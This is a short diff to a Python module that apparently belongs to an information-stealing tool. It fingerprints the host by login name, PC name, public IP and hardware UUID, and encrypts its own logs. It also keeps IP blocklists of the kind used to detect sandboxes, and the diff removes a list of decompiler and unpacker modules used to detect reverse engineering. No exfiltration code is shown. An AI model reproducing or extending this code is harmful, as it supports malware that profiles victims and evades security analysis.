@@ -12,7 +12,6 @@ Made With ❤️ By Ghoul & Marci
 import os
 import re
 import wmi
-import subprocess
 import uuid
 
 
@@ -26,7 +25,7 @@ from .utils.http import getIPAddress
 @final
 class UserInfo:
     USERNAME: Final[str] = os.getlogin()
-    PC_NAME: Final[str] = os.getenv("COMPUTERNAME")
+    PC_NAME: Final[str] = os.getenv("COMPUTERNAME") or "Unknown-PC"
     IP: Final[str] = getIPAddress()
     COMPUTER: Any = wmi.WMI()
     HWID: Final[str] = COMPUTER.Win32_ComputerSystemProduct()[0].UUID
@@ -39,11 +38,11 @@ class LoggingInfo:
     KEY: bytes = Fernet.generate_key()
     CIPHER: Fernet = Fernet(KEY)
 
-    def encrypted_formatter(record) -> str:
-        encrypted: bytes = LoggingInfo.CIPHER.encrypt(
-            record["message"].encode("utf8"))
-        record["extra"]["encrypted"] = b64encode(encrypted).decode("latin1")
-        return "[{time:YYYY-MM-DD HH:mm:ss}] {module}::{function}({line}) - {extra[encrypted]}\n{exception}"
+
+def encrypted_formatter(record) -> str:
+    encrypted: bytes = LoggingInfo.CIPHER.encrypt(record["message"].encode("utf8"))
+    record["extra"]["encrypted"] = b64encode(encrypted).decode("latin1")
+    return "[{time:YYYY-MM-DD HH:mm:ss}] {module}::{function}({line}) - {extra[encrypted]}\n{exception}"
 
 
 @final
@@ -287,17 +286,6 @@ class Lists:
         "35.192.93.107",
         "213.33.190.22",
         "194.154.78.152",
-    ]
-    BLACKLISTED_IMPORTS: Final[List[str]] = [
-        "pydecipher",
-        "unpy2exe",
-        "uncompyle6",
-        "pefile",
-        "marshal",
-        "unpy2exe",
-        "pyarmor",
-        "pyarmor-webui",
-        "pyinject",
     ]
     PROXY_IPS: Final[List[str]] = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]
     PROXY_HEADERS: Final[List[str]] = ["Via", "Forwarded", "X-Forwarded-For"]
